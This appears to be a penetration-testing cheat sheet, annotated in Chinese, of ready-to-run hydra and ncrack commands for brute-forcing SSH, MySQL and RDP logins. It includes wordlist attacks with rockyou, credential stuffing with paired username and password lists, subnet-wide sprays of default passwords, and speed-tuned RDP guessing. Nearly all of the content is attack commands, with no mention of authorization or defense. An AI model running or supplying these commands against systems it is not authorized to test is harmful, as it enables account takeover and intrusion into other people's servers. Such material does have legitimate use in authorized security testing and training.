## hydra

__ssh__

sudo hydra -l root -P wordlist.TXT ssh：//192.168.136.142

__mysql__

```sh
-l <user_string>
-L <user_file>
-p <password_string>
-P <password_file>

# 爆破mysql
hydra -l root -P ./password.txt -t 1 -e n -f -v 192.168.43.17 mysql -w 1
hydra -l root -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
hydra -L ./user.txt -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql

# 爆破ssh
hydra -l serlon -P pass.txt 192.168.0.227 ssh     # 知道用户名不知道密码
hydra -l jan -P /opt/rockyou.txt ssh://10.10.100.180 # 知道用户名不知道密码
hydra -L userlist.txt -p 123456 192.168.0.227 ssh # 知道密码不知道用户名
hydra -l admin -p password 192.168.0.0/24 ssh     # 知道用户名和密码但不知道ip
hydra -C default.txt 192.168.0.227                # 知道一组成对的用户名和密码来撞库
hydra -L logins.txt -P pws.txt -M target.txt ssh  # 都不知道


# 3389 rdp
hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
```

## ncrack 3389 rdp 爆破
```sh
ncrack -p 3389 -v -user admin -pass 123456 192.168.52.0/24
ncrack -p 3389 -v -user admin -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
ncrack -p 3389 -v -user admin -pass 123456Aa@@ 192.168.52.143

# -T<0-5> 越高越快
ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt 

```